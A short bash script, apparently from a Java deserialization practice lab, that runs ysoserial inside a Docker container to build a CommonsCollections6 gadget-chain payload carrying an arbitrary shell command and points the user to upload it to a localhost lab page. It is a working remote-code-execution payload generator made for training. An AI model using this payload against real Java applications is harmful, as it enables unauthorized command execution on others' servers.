#!/bin/bash
# class19 — CC6链 (CommonsCollections6)
# 靶场: /class19/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
docker cp ../../lib/ysoserial.jar javaserial-lab:/tmp/ysoserial.jar 2>/dev/null
docker exec javaserial-lab java -jar /tmp/ysoserial.jar CommonsCollections6 "$CMD" > ../../class19.ser 2>/dev/null
echo "✅ 已生成: class19.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class19/"
